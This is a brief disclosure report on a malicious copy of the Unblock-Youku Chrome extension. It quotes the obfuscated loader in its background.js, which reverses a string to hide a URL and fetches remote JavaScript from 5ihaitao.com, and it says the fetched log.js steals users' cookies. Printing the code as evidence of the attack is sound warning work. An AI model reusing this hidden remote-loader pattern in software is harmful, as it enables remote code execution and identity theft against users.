Name: 优酷土豆海外播放

CWS ID: aeocankoflefcaiabdkdjkenofcpjagb

Homepage: `https://chrome.google.com/webstore/detail/%E4%BC%98%E9%85%B7%E5%9C%9F%E8%B1%86%E6%B5%B7%E5%A4%96%E6%92%AD%E6%94%BE/aeocankoflefcaiabdkdjkenofcpjagb`

This is a malicious copy the extension Unblock-Youku (ID: pdnfnkhpgegpcingjbfihlkjeighnddk).

In its background.js file, you can find

```javascript
function chk() {
    var a = new XMLHttpRequest;
    a.onreadystatechange = function () {
        4 == a.readyState && (localStorage.updated = a.responseText)
    };
    a.open("GET", "sj.gol/gol/moc.oatiahi5.emorhc//:ptth".split("").reverse().join(""), !0);
    a.send(null)
}
```

It will download arbitrary javascript code from their server `5ihaitao.com`, and execute it on your local computers.

The current version of the log.js file is kept a record in this folder.

You can check that the log.js file actually gets and manipulates users' website cookies, which can actually steal your online indentities and leak your private and important information.
